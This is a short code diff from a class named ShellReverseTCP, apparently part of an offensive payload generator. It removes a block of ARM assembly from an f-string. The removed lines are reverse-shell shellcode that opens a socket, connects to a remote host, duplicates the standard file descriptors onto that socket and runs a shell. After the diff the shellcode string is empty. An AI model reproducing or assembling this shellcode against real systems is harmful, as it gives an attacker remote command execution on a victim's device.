@@ -45,41 +45,6 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
         rport = self.convert_port(options['RPORT'])
 
         shellcode = f"""
-        start:
-            mov r0, #2
-            mov r1, #1
-            add r2, r1, #5
-            mov r7, #140
-            add r7, r7, #141
-            svc 0
-
-            mov r6, r0
-            add r1, pc, #96
-            mov r2, #16
-            mov r7, #141
-            add r7, r7, #142
-            svc 0
-
-            mov r1, #3
-
-        dup:
-            sub r1, 1
-            mov r0, r6
-            mov r7, #63
-            svc 0
-
-            cmp r1, #0
-            bne dup
-
-            add r0, pc, #36
-            eor r4, r4, r4
-            push \{r4\}
-            mov r2, sp
-            add r4, pc, #36
-            push \{r4\}
-            mov r1, sp
-            mov r7, #11
-            svc 0
         """
 
         if assemble:
